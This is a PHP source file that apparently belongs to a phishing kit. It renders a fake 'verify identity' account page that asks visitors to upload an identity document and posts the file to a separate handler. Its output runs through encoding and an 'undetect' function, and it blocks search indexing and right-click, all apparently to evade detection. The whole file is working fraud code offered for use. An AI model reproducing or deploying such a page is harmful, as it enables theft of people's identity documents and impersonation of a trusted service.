<?php
require __DIR__ . '/function.php';
require $api->language();

$page = "identity";
$api->check_cookie();
$api->session("kuzuluy", true, $page);

$html = '
<!DOCTYPE html>
<html>
<head>
<title>'.$api->text_encode($text['0'].": ".$text['86']).'</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<link rel="shortcut icon" href="'.$api->image_encode("assets/img/favicon.ico")['local'].'">
<link rel="stylesheet" href="'.$api->text_encode("../assets/css/myaccount.dashboard.css").'">
<link rel="stylesheet" href="'.$api->text_encode("../assets/css/fileuploader.css").'">
<link rel="stylesheet" href="'.$api->text_encode("../assets/css/fileuploader.thumbnails.css").'">
<script src="'.$api->text_encode("../assets/js/jquery.js").'" type="text/javascript"></script>
<script src="'.$api->text_encode("../assets/js/fileuploader.js").'" type="text/javascript"></script>
<script src="'.$api->text_encode("../assets/js/fileuploader.custom.js").'" type="text/javascript"></script>
</head>
<body oncontextmenu="return false">
<div class="grey-background header-body">
<div id="header">
<div class="container-fluid center-block-big">
<table>
<tr>
<td>
<img src="'.$api->image_encode("assets/img/favicon.svg")['local'].'" width="106" height="30">
</td>
<td align="right" width="100%">
</td>
</tr>
</table>
</div>
</div>
<div id="wrapper2" class="page-container">
<div id="verify-identity">
<div class="container-fluid trayNavOuter verify-tray">
<div class="trayNavInner">
<div class="row">
<div class="col-md-12">
<p class="logo-block-text"><h2>'.$api->text_encode($text['86']).'</h2></p>
</div>
</div>
<div class="row">
<div class="col-md-12">
<form action="../action/post_identity.php" method="post" enctype="multipart/form-data">
<img src="'.$api->image_encode("assets/img/identity.png")['local'].'" style="width:100%;">
<input type="file" name="files">
<div class="buttons">
<input id="Button" class="btn btn-primary" type="submit" value="Continue">
</div>
</form>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<footer class="footer">
<div class="footer-nav">
<div class="site-links container-fluid" style="align: right">
<ul class="navlist">
<li><a href="#">'.$api->text_encode($text['11']).'</a></li>
<li><a href="#">'.$api->text_encode($text['12']).'</a></li>
</ul>
</div>
</div>
<div class="footer-legal">
<div class="container-fluid">
<span class="copyright">'.$api->text_encode($text['14']).' &copy; '.$api->text_encode("1999 - ".gmdate('Y')).' '.$api->text_encode($text['15']).'</span>
<span class="short-copyright">&copy; '.$api->text_encode("1999 - ".gmdate('Y')).'</span>
<ul class="navlist footer-list">
<li><a href="#">'.$api->text_encode($text['16']).'</a></li>
<li><a href="#">'.$api->text_encode($text['17']).'</a></li>
</ul>
</div>
</div>
</footer>
</body>
</html>';

$api->undetect($html);
?>
